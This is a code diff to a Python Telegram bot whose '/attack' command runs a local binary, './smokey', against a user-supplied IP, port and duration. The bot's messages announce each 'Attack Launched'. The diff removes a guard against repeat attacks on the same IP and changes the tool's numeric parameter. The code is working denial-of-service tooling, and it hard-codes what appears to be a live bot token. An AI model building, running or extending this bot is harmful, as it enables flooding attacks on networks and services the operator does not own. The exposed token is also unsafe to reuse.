@@ -8,9 +8,6 @@ TELEGRAM_BOT_TOKEN = '8057194164:AAFvsc9POy1u-QSKXLNWMDcbW9zi_9Fm-oU'
 ALLOWED_USER_ID = 775750246 
 bot_access_free = True  
 
-# Store attacked IPs to prevent duplicate attacks
-attacked_ips = set()
-
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
@@ -23,7 +20,7 @@ async def start(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./smokey {ip} {port} {duration} 1200",
+            f"./smokey {ip} {port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -55,12 +52,6 @@ async def attack(update: Update, context: CallbackContext):
 
     ip, port, duration = args
 
-    if ip in attacked_ips:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
-        return
-
-    attacked_ips.add(ip)  # Store attacked IP
-
     await context.bot.send_message(chat_id=chat_id, text=( 
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
@@ -79,4 +70,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
